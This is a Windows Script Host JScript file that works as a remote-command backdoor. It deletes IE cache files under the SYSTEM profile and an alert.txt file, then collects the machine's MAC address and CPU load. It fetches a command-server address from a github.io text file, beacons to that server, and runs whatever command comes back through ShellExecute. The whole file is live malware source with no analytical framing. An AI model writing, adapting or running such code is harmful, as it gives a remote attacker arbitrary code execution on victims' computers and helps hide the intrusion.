function utf8_decode (str) {
    var x = str;
    var r = /\\u([\d\w]{4})/gi;
    x = x.replace(r, function (match, grp) {
        return String.fromCharCode(parseInt(grp, 16)); } );
        x = unescape(x);
        return(x);
        }

function check() {
    var fs = new ActiveXObject("Scripting.FileSystemObject");
    var sh = WScript.CreateObject("WScript.Shell");
    var sroot = sh.ExpandEnvironmentStrings("%SystemRoot%");
    ietmp = sroot + "\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\*.*";
    try{fs.DeleteFile(ietmp, true)} catch(e){}
    var objFile = fs.GetFile(WScript.ScriptFullName);
    var strFolder = fs.GetParentFolderName(objFile);
    alert_txt = strFolder + "\\alert.txt"
    try{fs.DeleteFile(alert_txt, true)} catch(e){}
    var mac = '00:00:00:00:00:00';
    var objWMI = GetObject("winmgmts:\\\\.\\root\\cimv2");
    query = "select PercentProcessorTime from Win32_PerfFormattedData_PerfOS_Processor where Name ='_Total'";
    var colItems = new Enumerator(objWMI.ExecQuery(query));
    if (!colItems.atEnd()) { var cpu = colItems.item().PercentProcessorTime }
    query = "SELECT *  FROM Win32_NetworkAdapterConfiguration Where IPEnabled = 'True' AND DHCPEnabled = 'True'";
    var colItems = new Enumerator(objWMI.ExecQuery(query));
    if (!colItems.atEnd()) { var mac = colItems.item().MACAddress.toLowerCase()}

    with(new ActiveXObject('MSXML2.ServerXMLHTTP.6.0')){
        URL_BASE = "https://grf-ap.github.io/https.txt";
        open('GET',URL_BASE,false);
        send();
        url = responseText;
        url = url + '/' + mac + '/' + cpu;
        open('GET', url ,false);
        setRequestHeader("User-Agent", "custom");
        send();
        com = utf8_decode(responseText);
    }
    com = com.replace(/[\n\r]|{|}|^\s+|\s+$|\"/gm, '');
    var arr = com.split(':');
    com = arr[1];
    com = com.replace(/^\s+|\s+$/g, '');
    com = com.replace(/\\/g, '"');
    WScript.Echo(com);

    if (!isNaN(com)){ WScript.Quit() }

    var comArr = com.split(" ");
    com = comArr.shift( );
    var params = comArr.join(" ");
    var S = WScript.CreateObject("Shell.Application");
    S.ShellExecute(com, params, strFolder, "open", 1);
}
check();